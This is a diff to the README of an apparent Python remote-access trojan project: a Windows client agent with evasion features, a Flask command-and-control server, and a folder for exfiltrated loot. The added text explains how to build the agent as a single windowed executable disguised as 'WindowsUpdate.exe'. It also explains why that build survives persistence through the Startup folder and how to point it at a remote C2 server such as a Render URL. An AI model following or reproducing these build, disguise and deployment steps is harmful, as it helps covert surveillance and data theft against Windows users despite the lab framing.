@@ -96,7 +96,8 @@
 ├── loot/                     # Exfiltrated files organized by hostname
 ├── venv/                     # Python virtual environment
 ├── client.py                 # Windows RAT agent with evasion capabilities
-├── client.spec               # PyInstaller build specification
+├── WindowsUpdate.spec        # PyInstaller payload build (onefile, windowed)
+├── client.spec               # PyInstaller debug build (onedir, console)
 ├── control_panel.py          # Alternative CustomTkinter GUI
 ├── server.py                 # Flask C2 server with encrypted communications
 ├── requirements.txt          # Python dependencies
@@ -168,14 +169,12 @@ pnpm tauri dev
 The Tauri application launches the operator interface, providing real-time telemetry, terminal access, and file management.
 
 ### 3. Deploying and Configuring the Endpoint Client
-Before running or compiling `client.py`, update the configuration block in `client.py`:
-```python
-# client.py configuration
-C2_DOMAIN = "http://127.0.0.1:443/"  # Laboratory server address
-POLLING_DELAY = 1.0                   # Polling frequency in seconds
-JITTER = 0.2                          # Random delay range in seconds
-ANTI_VM = False                       # Set to False for local testing/VMs
+Before running or compiling `client.py`, set the C2 address via the `C2_DOMAIN` variable — either in a `.env` file next to the client or in the environment:
+```powershell
+# .env (resolved relative to the client's working directory)
+C2_DOMAIN=http://127.0.0.1:443/      # Laboratory server address
 ```
+Other knobs (`POLLING_DELAY`, `JITTER`, `ANTI_VM`, ...) live in the configuration block at the top of `client.py`.
 
 Run the endpoint agent on the test Windows system:
 ```powershell
@@ -183,14 +182,18 @@ python client.py
 ```
 
 ### 4. Building Standalone Executables
-To compile a standalone Windows client executable using PyInstaller:
+To compile the payload executable with PyInstaller:
 ```powershell
-pyinstaller .\client.spec --noconfirm
+pyinstaller .\WindowsUpdate.spec --noconfirm
 ```
 The compiled executable will be generated at:
 ```
 ./dist/WindowsUpdate.exe
 ```
+
+> **Why two spec files?** `WindowsUpdate.spec` is the deployable payload: a **onefile**, windowed executable. This matters because persistence (`add_persistence()`) copies *only* the exe itself into the Startup folder — an onefile build is self-contained and survives the copy. `client.spec` produces an **onedir** console build (`dist/client/client.exe` + `_internal\` folder), useful only for local debugging; its bare exe will not run if copied elsewhere.
+
+> **Note:** the client resolves `C2_DOMAIN` from a `.env` file in its working directory, falling back to `http://127.0.0.1:443`. When launching `dist\WindowsUpdate.exe` from `dist\`, drop a `.env` beside it to target a different server (e.g., your Render URL).
 
 ---
 
